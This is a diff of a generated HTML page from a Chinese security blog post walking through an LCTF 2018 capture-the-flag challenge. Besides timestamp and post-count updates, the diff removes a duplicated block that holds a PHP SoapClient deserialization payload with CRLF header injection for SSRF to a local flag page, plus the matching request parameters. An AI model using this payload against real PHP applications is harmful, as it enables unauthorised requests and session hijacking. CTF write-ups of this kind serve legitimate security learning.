@@ -52,7 +52,7 @@
 <meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/b94d1d91b3f9ceb3caa0132bb92c9455.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/46f72698a63e80975c05d30ab10fa5ec.png">
 <meta property="article:published_time" content="2022-02-21T16:33:32.669Z">
-<meta property="article:modified_time" content="2022-03-29T14:44:26.428Z">
+<meta property="article:modified_time" content="2022-03-29T15:09:28.858Z">
 <meta property="article:author" content="Y0ng">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://img-blog.csdnimg.cn/img_convert/be95323c75f12e020bbfeaac994246fd.png">
@@ -160,7 +160,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">168</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">170</span></a>
 
   </li>
         <li class="menu-item menu-item-schedule">
@@ -253,7 +253,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-03-29 22:44:26" itemprop="dateModified" datetime="2022-03-29T22:44:26+08:00">2022-03-29</time>
+                <time title="修改时间：2022-03-29 23:09:28" itemprop="dateModified" datetime="2022-03-29T23:09:28+08:00">2022-03-29</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -481,19 +481,6 @@
 <p>这样 call_user_func($b,$a)就变成<strong>call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’))</strong> ，即调用 SoapClient 类不存在的 welcome_to_the_lctf2018 方法，从而触发 __call 方法发起 soap 请求进行 SSRF </p>
 <p><img src="https://img-blog.csdnimg.cn/img_convert/46f72698a63e80975c05d30ab10fa5ec.png" alt="image-20220221153914520"></p>
 <p>修改phpsessid为123456，访问index.php即可</p>
-<p>on反序列化引擎的不同，传入反序列化字符串</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target&#x3D;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&#39;;</span><br><span class="line">$b &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,</span><br><span class="line">    &#39;user_agent&#39; &#x3D;&gt; &quot;npfs\r\nCookie:PHPSESSID&#x3D;123456\r\n&quot;,</span><br><span class="line">    &#39;uri&#39; &#x3D;&gt; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;&quot;));</span><br><span class="line"></span><br><span class="line">$se &#x3D; serialize($b);</span><br><span class="line">echo &quot;|&quot;.urlencode($se);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;注意下，这个脚本想要执行，需要将php.ini里的 php_soap.dll 前面的分号去掉</span><br></pre></td></tr></table></figure>
-
-<p>传入</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?f&#x3D;session_start&amp;name&#x3D;|O%3A10%3A%22SoapClient%22%3A.......</span><br><span class="line">&#x2F;&#x2F;POST</span><br><span class="line">serialize_handler&#x3D;php_serialize</span><br></pre></td></tr></table></figure>
-
-<p>[外链图片转存中…(img-K1JJSkC5-1648565029478)]</p>
-<p>传值</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f&#x3D;extract&amp;name&#x3D;SoapClient </span><br><span class="line">POST:b&#x3D;call_user_func</span><br></pre></td></tr></table></figure>
-
-<p>这样 call_user_func($b,$a)就变成<strong>call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’))</strong> ，即调用 SoapClient 类不存在的 welcome_to_the_lctf2018 方法，从而触发 __call 方法发起 soap 请求进行 SSRF </p>
-<p>[外链图片转存中…(img-L58l8rEi-1648565029478)]</p>
-<p>修改phpsessid为123456，访问index.php即可</p>
 
     </div>
 
@@ -590,7 +577,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">168</span>
+          <span class="site-state-item-count">170</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
